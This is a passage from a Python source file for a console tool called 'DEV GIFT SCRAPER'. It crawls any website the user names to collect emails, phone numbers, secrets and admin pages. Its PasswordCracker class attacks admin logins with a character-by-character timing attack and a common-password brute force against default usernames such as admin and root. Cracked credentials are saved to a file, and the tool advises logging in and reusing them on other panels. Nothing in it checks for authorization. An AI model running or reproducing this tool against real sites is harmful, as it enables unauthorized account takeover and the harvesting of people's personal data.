            print(f"{GREEN}✅ Found {len(self.login_forms)} login forms{NC}")
            for form in self.login_forms[:5]:
                print(f"  {GREEN}▶{NC} {form['url']} ({form['method']})")
            
            if not self.api_endpoints and not self.login_forms:
                print(f"{YELLOW}⚠ No login mechanisms found on this page{NC}")
                print(f"{YELLOW}💡 Try a different admin panel URL{NC}")
                return False
            
            return True
            
        except Exception as e:
            print(f"{RED}✗ Discovery error: {e}{NC}")
            return False
    
    def test_credentials(self, username, password, api_url, method='POST'):
        try:
            payloads = [
                {'username': username, 'password': password},
                {'email': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'password': password},
                {'log': username, 'pwd': password},
                {'user_login': username, 'user_pass': password},
                {'user_name': username, 'user_pass': password},
                {'email': username, 'pass': password},
                {'user': username, 'password': password}
            ]
            
            for payload in payloads:
                try:
                    if method.upper() == 'POST':
                        response = self.session.post(
                            api_url,
                            json=payload,
                            timeout=10,
                            verify=False,
                            allow_redirects=False
                        )
                    else:
                        response = self.session.get(
                            api_url,
                            params=payload,
                            timeout=10,
                            verify=False,
                            allow_redirects=False
                        )
                    
                    if response.status_code in [200, 201, 202, 302, 301, 303]:
                        content = response.text.lower()
                        if any(word in content for word in SUCCESS_INDICATORS):
                            return True
                        if not any(word in content for word in FAILURE_INDICATORS):
                            if len(content) > 100:
                                return True
                        if len(response.cookies) > 0:
                            return True
                    return False
                except:
                    continue
            return False
        except:
            return False
    
    def timing_attack(self, username):
        print(f"\n{CYAN}⏱️ TIMING ATTACK EXTRACTION{NC}")
        print(f"{YELLOW}👤 Target: {username}{NC}")
        animate_loading("Preparing timing analysis...", 1)
        
        if not self.api_endpoints:
            print(f"{RED}✗ No API endpoints found{NC}")
            return None
        
        api_url = self.api_endpoints[0]
        extracted = ""
        baseline = None
        
        try:
            baseline_start = time.perf_counter()
            self.session.post(api_url, json={'username': username, 'password': 'X'*30}, timeout=10, verify=False)
            baseline = time.perf_counter() - baseline_start
        except:
            baseline = 0.5
        
        print(f"{BLUE}📊 Baseline: {baseline:.4f}s{NC}\n")
        
        for position in range(30):
            found = False
            
            for char in self.characters:
                test_pass = extracted + char + "X" * (29 - len(extracted))
                
                try:
                    start = time.perf_counter()
                    response = self.session.post(
                        api_url,
                        json={'username': username, 'password': test_pass},
                        timeout=10,
                        verify=False
                    )
                    duration = time.perf_counter() - start
                    
                    progress = int((position * 100) / 30)
                    print(f"\r{BLUE}[{NC}{'█' * (progress//2)}{'░' * (50 - progress//2)}{BLUE}]{NC} {WHITE}{progress:3d}%{NC} Testing position {position+1}: {char}", end='')
                    
                    if response.status_code in [200, 302, 301]:
                        extracted += char
                        print(f"\n{GREEN}✅ Found character {position+1}: '{char}' (success){NC}")
                        print(f"{GREEN}   Current: {extracted}{NC}")
                        found = True
                        break
                    
                    if duration > baseline + 0.02:
                        verify_start = time.perf_counter()
                        self.session.post(api_url, json={'username': username, 'password': extracted + char + "X" * (29 - len(extracted))}, timeout=10, verify=False)
                        verify_duration = time.perf_counter() - verify_start
                        
                        if verify_duration > baseline + 0.02:
                            extracted += char
                            print(f"\n{GREEN}✅ Found character {position+1}: '{char}' (timing: {duration:.4f}s){NC}")
                            print(f"{GREEN}   Current: {extracted}{NC}")
                            found = True
                            break
                except:
                    continue
            
            if not found:
                break
        
        if extracted:
            print(f"\n{GREEN}🎯 Extracted password: {extracted}{NC}")
            return extracted
        else:
            print(f"\n{YELLOW}⚠ No password extracted via timing attack{NC}")
            return None
    
    def brute_force(self, username):
        print(f"\n{CYAN}💪 BRUTE FORCE EXTRACTION{NC}")
        print(f"{YELLOW}👤 Target: {username}{NC}")
        animate_loading("Loading password dictionary...", 1)
        
        if not self.api_endpoints:
            print(f"{RED}✗ No API endpoints found{NC}")
            return None
        
        api_url = self.api_endpoints[0]
        total = len(COMMON_PASSWORDS)
        
        print(f"\n{YELLOW}Testing {total} common passwords...{NC}\n")
        
        for i, password in enumerate(COMMON_PASSWORDS):
            progress = int(((i + 1) * 100) / total)
            print(f"\r{BLUE}[{NC}{'█' * (progress//2)}{'░' * (50 - progress//2)}{BLUE}]{NC} {WHITE}{progress:3d}%{NC} Testing: {password}", end='')
            
            try:
                if self.test_credentials(username, password, api_url):
                    print(f"\n{GREEN}✅ FOUND PASSWORD: {password}{NC}")
                    return password
            except:
                continue
        
        print(f"\n{YELLOW}⚠ No password found in common list{NC}")
        return None
    
    def extract_password(self):
        print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{NC}")
        print(f"{CYAN}║{NC}              {BOLD}🚀 PASSWORD EXTRACTION ENGINE{BOLD}{NC}{CYAN}                           {NC}")
        print(f"{CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{NC}")
        
        if not self.discover():
            return None
        
        if not self.api_endpoints and not self.login_forms:
            print(f"{RED}✗ No login mechanisms found{NC}")
            return None
        
        for username in ['admin', 'root', 'user', 'test', 'administrator', 'superuser', 'webmaster']:
            print(f"\n{YELLOW}🎯 Trying username: {username}{NC}")
            
            password = self.timing_attack(username)
            if password and len(password) > 0:
                self.found_credentials.append({
                    'username': username,
                    'password': password,
                    'method': 'timing_attack'
                })
                print(f"\n{GREEN}✅ SUCCESS!{NC}")
                print(f"{GREEN}   Username: {username}{NC}")
                print(f"{GREEN}   Password: {password}{NC}")
                print(f"{GREEN}   Method: Timing Attack{NC}")
                return {'username': username, 'password': password, 'method': 'timing_attack'}
            
            password = self.brute_force(username)
            if password and len(password) > 0:
                self.found_credentials.append({
                    'username': username,
                    'password': password,
                    'method': 'brute_force'
                })
                print(f"\n{GREEN}✅ SUCCESS!{NC}")
                print(f"{GREEN}   Username: {username}{NC}")
                print(f"{GREEN}   Password: {password}{NC}")
                print(f"{GREEN}   Method: Brute Force{NC}")
                return {'username': username, 'password': password, 'method': 'brute_force'}
        
        print(f"\n{RED}❌ No credentials found{NC}")
        print(f"{YELLOW}💡 Tips:{NC}")
        print(f"  • Try different admin panel URLs")
        print(f"  • Check if the login page requires CSRF tokens")
        print(f"  • Try custom username lists")
        return None

def scrape_website():
    global start_time, site_domain, all_links_found, total_requests, valid_requests
    global visited_urls, all_images, all_videos, all_documents, found_emails
    global found_phones, found_secrets, found_admin_pages, found_social_media
    global found_subdomains, all_js_files, all_css_files, all_forms, all_meta_tags
    global api_endpoints_found, login_forms_found, successful_logins
    
    clear()
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              🎯 TARGET WEBSITE INPUT                                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
    print(f"""{YELLOW}┌───────────────────────────────────────────────────────────────────────────┐
│  EXAMPLE: example.com                                                       │
│  NOTE: Don't add http:// or https://                                        │
│  MAX PAGES: 200 (can be increased)                                          │
└───────────────────────────────────────────────────────────────────────────┘
{NC}""")
    site = input(f"{YELLOW}┌─[{GREEN}ENTER TARGET URL{YELLOW}]{NC}\n└──➜ ")
    site = site.replace('https://', '').replace('http://', '').rstrip('/')
    base_url = f"https://{site}"
    site_domain = site

    visited_urls = set()
    all_links_found = set()
    all_images = set()
    all_videos = set()
    all_documents = set()
    found_emails = set()
    found_phones = set()
    found_secrets = []
    found_admin_pages = []
    found_social_media = []
    found_subdomains = set()
    all_js_files = set()
    all_css_files = set()
    all_forms = []
    all_meta_tags = {}
    total_requests = 0
    valid_requests = 0
    start_time = time.time()
    api_endpoints_found = []
    login_forms_found = []
    successful_logins = []

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    result_file = f"{site}_scrape_{timestamp}.txt"

    clear()
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║           🚀 DEV GIFT SCRAPER ENGINE                                         ║
║           🕷️ COMPLETE WEBSITE RIPPER                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
    print(f"""{BLUE}┌───────────────────────────────────────────────────────────────────────────┐
│  TARGET: {WHITE}{base_url}{BLUE}                                                 │
│  STATUS: {YELLOW}INITIALIZING...{BLUE}                                           │
└───────────────────────────────────────────────────────────────────────────┘
{NC}""")

    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{BOLD}📡 PHASE 1: FETCHING HOMEPAGE{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        animate_loading("Connecting to target...", 1.5)
        response = session.get(base_url, timeout=30, verify=False)
        print(f"{GREEN}✓ HOMEPAGE LOADED!{NC}")
        print(f"{GREEN}✓ PAGE SIZE: {len(response.text)} bytes{NC}")
        print(f"{GREEN}✓ STATUS: {response.status_code}{NC}\n")
        
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{BOLD}🌐 PHASE 2: FINDING SUBDOMAINS{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        animate_loading("Scanning for subdomains...", 1)
        subdomains = find_subdomains(base_url)
        found_subdomains.update(subdomains)
        for sub in subdomains:
            print(f"  {GREEN}✓{NC} {sub}")
        if not subdomains:
            print(f"  {YELLOW}⚠ No subdomains found{NC}")
        
        print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{BOLD}🗺️ PHASE 3: PARSING SITEMAP{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        animate_loading("Searching for sitemap...", 1)
        sitemap_urls = parse_sitemap(base_url)
        print(f"{GREEN}✓ Found {len(sitemap_urls)} URLs in sitemap{NC}")
        
        print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{BOLD}🕷️ PHASE 4: DEEP CRAWLING ALL PAGES{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        urls_to_crawl = list(sitemap_urls) + [base_url]
        
        for path in ADMIN_PATHS:
            urls_to_crawl.append(urljoin(base_url, path))
        
        max_pages = 200
        urls_to_crawl = urls_to_crawl[:max_pages]
        
        print(f"{YELLOW}► Crawling {len(urls_to_crawl)} pages...{NC}\n")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(scrape_page, url, session): url for url in urls_to_crawl}
            
            completed = 0
            total = len(futures)
            
            for future in as_completed(futures):
                completed += 1
                progress_bar(completed, total, f"Scraping page {completed}/{total}")
                result = future.result()
                
                if result and result.get('links'):
                    new_links = list(result['links'])[:5]
                    for link in new_links:
                        if link not in visited_urls and site_domain in link:
                            if len(urls_to_crawl) < max_pages:
                                urls_to_crawl.append(link)
        
        print(f"\n{GREEN}✓ Crawling complete!{NC}")
        animate_loading("Processing results...", 1)
        
        admin_panels_found = []
        for page in found_admin_pages:
            if 'admin' in page.get('type', '').lower() or 'login' in page.get('type', '').lower():
                admin_panels_found.append(page['url'])
        
        print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{BOLD}📊 SCRAPE RESULTS{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        print(f"\n{YELLOW}► PAGES FOUND: {len(visited_urls)}{NC}")
        print(f"{YELLOW}► ADMIN PANELS: {len(admin_panels_found)}{NC}")
        for panel in admin_panels_found[:10]:
            print(f"  {GREEN}🔐{NC} {panel}")
        
        print(f"\n{YELLOW}► EMAILS FOUND: {len(found_emails)}{NC}")
        for email in list(found_emails)[:10]:
            print(f"  {GREEN}✉{NC} {email}")
        
        print(f"\n{YELLOW}► PHONES FOUND: {len(found_phones)}{NC}")
        for phone in list(found_phones)[:10]:
            print(f"  {GREEN}📞{NC} {phone}")
        
        print(f"\n{YELLOW}► SECRETS FOUND: {len(found_secrets)}{NC}")
        for secret in found_secrets[:10]:
            print(f"  {RED}🔑{NC} {secret.get('type')}: {secret.get('value')}")
        
        print(f"\n{YELLOW}► RESOURCES:{NC}")
        print(f"  {GREEN}▶{NC} Images: {len(all_images)}")
        print(f"  {GREEN}▶{NC} CSS: {len(all_css_files)}")
        print(f"  {GREEN}▶{NC} JS: {len(all_js_files)}")
        print(f"  {GREEN}▶{NC} Forms: {len(all_forms)}")
        print(f"  {GREEN}▶{NC} Videos: {len(all_videos)}")
        
        results = []
        results.append("═" * 80)
        results.append("🔥 DEV GIFT SCRAPER - SCRAPE RESULTS")
        results.append("═" * 80)
        results.append(f"TARGET: {base_url}")
        results.append(f"DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        results.append(f"TIME: {int(time.time() - start_time)} seconds")
        results.append("═" * 80)
        results.append("")
        
        results.append("📊 STATISTICS:")
        results.append("-" * 40)
        results.append(f"  Pages: {len(visited_urls)}")
        results.append(f"  Links: {len(all_links_found)}")
        results.append(f"  Images: {len(all_images)}")
        results.append(f"  CSS: {len(all_css_files)}")
        results.append(f"  JS: {len(all_js_files)}")
        results.append(f"  Videos: {len(all_videos)}")
        results.append(f"  Forms: {len(all_forms)}")
        results.append("")
        
        results.append("🔑 ADMIN PANELS:")
        results.append("-" * 40)
        if admin_panels_found:
            for panel in admin_panels_found:
                results.append(f"  {panel}")
        else:
            results.append("  None found")
        results.append("")
        
        results.append("📧 EMAILS:")
        results.append("-" * 40)
        if found_emails:
            for email in sorted(found_emails):
                results.append(f"  {email}")
        else:
            results.append("  None found")
        results.append("")
        
        results.append("📞 PHONES:")
        results.append("-" * 40)
        if found_phones:
            for phone in sorted(found_phones):
                results.append(f"  {phone}")
        else:
            results.append("  None found")
        results.append("")
        
        results.append("🔐 SECRETS:")
        results.append("-" * 40)
        if found_secrets:
            for secret in found_secrets:
                results.append(f"  {secret.get('type')}: {secret.get('value')}")
        else:
            results.append("  None found")
        results.append("")
        
        results.append("🌐 SUBDOMAINS:")
        results.append("-" * 40)
        if found_subdomains:
            for sub in sorted(found_subdomains):
                results.append(f"  {sub}")
        else:
            results.append("  None found")
        results.append("")
        
        results.append("🖼️ IMAGES:")
        results.append("-" * 40)
        for img in list(all_images)[:20]:
            results.append(f"  {img}")
        if len(all_images) > 20:
            results.append(f"  ... and {len(all_images) - 20} more")
        results.append("")
        
        results.append("═" * 80)
        results.append(f"📁 Results saved to: {RESULTS_DIR}/{result_file}")
        results.append("═" * 80)
        
        result_content = "\n".join(results)
        saved_path = save_results(result_file, result_content)
        save_results("latest_scrape.txt", result_content)
        
        print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        print(f"{GREEN}✅ SCRAPE COMPLETE!{NC}")
        print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        if saved_path:
            print(f"\n{GREEN}✓ Results saved to: {WHITE}{saved_path}{NC}")
        
        print(f"\n{YELLOW}┌───────────────────────────────────────────────────────────────────────────┐")
        print(f"│  {GREEN}📁 RESULTS:{NC} {RESULTS_DIR}/{result_file}")
        print(f"│  {GREEN}📄 PAGES:{NC} {len(visited_urls)}")
        print(f"│  {GREEN}🔐 ADMIN PANELS:{NC} {len(admin_panels_found)}")
        print(f"│  {GREEN}🔑 SECRETS:{NC} {len(found_secrets)}")
        print(f"│  {GREEN}✉ EMAILS:{NC} {len(found_emails)}")
        print(f"{YELLOW}└───────────────────────────────────────────────────────────────────────────┘{NC}")
        
        print(f"\n{YELLOW}OPTIONS:{NC}")
        print(f"  {GREEN}[1]{NC} View results now")
        print(f"  {GREEN}[2]{NC} Back to menu")
        
        choice = input(f"\n{YELLOW}┌─[{GREEN}SELECT OPTION{YELLOW}]{NC}\n└──➜ ")
        
        if choice == '1':
            view_file(saved_path)
        
    except Exception as e:
        print(f"\n{RED}✗ ERROR: {e}{NC}")
        import traceback
        traceback.print_exc()
        input(f"\n{YELLOW}Press Enter to continue...{NC}")

def crack_password():
    clear()
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              🔐 PASSWORD CRACKER                                             ║
║              TARGET ADMIN PANEL                                              ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
    print(f"""{YELLOW}┌───────────────────────────────────────────────────────────────────────────┐
│  Enter the ADMIN PANEL URL to crack                                       │
│  Example: https://example.com/admin                                        │
│  Example: https://example.com/wp-login.php                                │
│  Example: https://example.com/dashboard                                   │
└───────────────────────────────────────────────────────────────────────────┘
{NC}""")
    admin_url = input(f"{YELLOW}┌─[{GREEN}ENTER ADMIN PANEL URL{YELLOW}]{NC}\n└──➜ ")
    
    if not admin_url.startswith('http'):
        admin_url = f"https://{admin_url}"
    
    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════════════════════╗{NC}")
    print(f"{CYAN}║{NC}              {BOLD}🔐 PASSWORD EXTRACTION IN PROGRESS{BOLD}{NC}{CYAN}                     {NC}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════════════════════╝{NC}")
    
    try:
        animate_loading("Initializing password cracker...", 1.5)
        cracker = PasswordCracker(admin_url)
        result = cracker.extract_password()
        
        if result:
            clear()
            print(f"""{GREEN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ✅ PASSWORD EXTRACTED SUCCESSFULLY!                             ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
            print(f"\n{GREEN}🔓 CREDENTIALS:{NC}")
            print(f"  {GREEN}👤 Username: {WHITE}{result['username']}{NC}")
            print(f"  {GREEN}🔑 Password: {WHITE}{result['password']}{NC}")
            print(f"  {GREEN}📊 Method: {WHITE}{result['method'].replace('_', ' ').title()}{NC}")
            print(f"  {GREEN}🔗 URL: {WHITE}{admin_url}{NC}")
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            cred_file = f"cracked_{timestamp}.txt"
            cred_content = f"""═" * 80
🔥 DEV GIFT SCRAPER - CRACKED CREDENTIALS
═" * 80
URL: {admin_url}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Username: {result['username']}
Password: {result['password']}
Method: {result['method']}
═" * 80"""
            save_results(cred_file, cred_content)
            print(f"\n{GREEN}✓ Credentials saved to: {RESULTS_DIR}/{cred_file}{NC}")
            
            print(f"\n{YELLOW}💡 Next Steps:{NC}")
            print(f"  • Try logging in with these credentials")
            print(f"  • Check for other admin panels with same credentials")
            print(f"  • Save these credentials securely")
            
            input(f"\n{GREEN}Press Enter to continue...{NC}")
        else:
            clear()
            print(f"""{RED}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ❌ PASSWORD EXTRACTION FAILED                                   ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
            print(f"\n{RED}❌ No credentials found{NC}")
            print(f"\n{YELLOW}💡 Suggestions:{NC}")
            print(f"  • Make sure the admin panel URL is correct")
            print(f"  • Check if the login page loads properly")
            print(f"  • Try different admin panel URLs")
            print(f"  • Ensure the login form is accessible")
            print(f"  • Check if the site uses CSRF protection")
            input(f"\n{YELLOW}Press Enter to continue...{NC}")
    
    except Exception as e:
        print(f"\n{RED}✗ ERROR: {e}{NC}")
        import traceback
        traceback.print_exc()
        input(f"\n{YELLOW}Press Enter to continue...{NC}")

def main_menu():
    while True:
        banner()
        print(f"""{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{BOLD}  📌 MAIN MENU{NC}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
        print(f"  {GREEN}┌─[1] SCRAPE WEBSITE (Everything){NC}")
        print(f"  {GREEN}│  └─ Full website crawling and data extraction{NC}")
        print(f"  {RED}┌─[2] PASSWORD CRACK (Target Admin){NC}")
        print(f"  {RED}│  └─ Extract passwords from admin panels{NC}")
        print(f"  {BLUE}┌─[3] FILE BROWSER (View Results){NC}")
        print(f"  {BLUE}│  └─ Browse, view, search, export files{NC}")
        print(f"  {PURPLE}┌─[4] ABOUT (Info){NC}")
        print(f"  {PURPLE}│  └─ Tool information and features{NC}")
        print(f"  {RED}└─[5] EXIT{NC}")
        print(f"     └─ Close the application")
        print(f"\n{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}")
        
        choice = input(f"\n{YELLOW}┌─[{GREEN}SELECT OPTION{YELLOW}]{NC}\n└──➜ ")

        if choice == '5':
            clear()
            print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              👋 GOODBYE!                                                      ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
            print(f"\n{YELLOW}🔒 Exiting DEV GIFT SCRAPER...{NC}")
            time.sleep(1)
            sys.exit(0)
        elif choice == '4':
            about()
        elif choice == '3':
            interactive_file_browser()
        elif choice == '2':
            crack_password()
        elif choice == '1':
            scrape_website()
        else:
            print(f"\n{RED}✗ INVALID OPTION{NC}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        clear()
        print(f"""
{RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║              ⚡ INTERRUPTED                                                   ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{NC}""")
        print(f"\n{YELLOW}🔒 Exiting...{NC}")
        sys.exit(0)
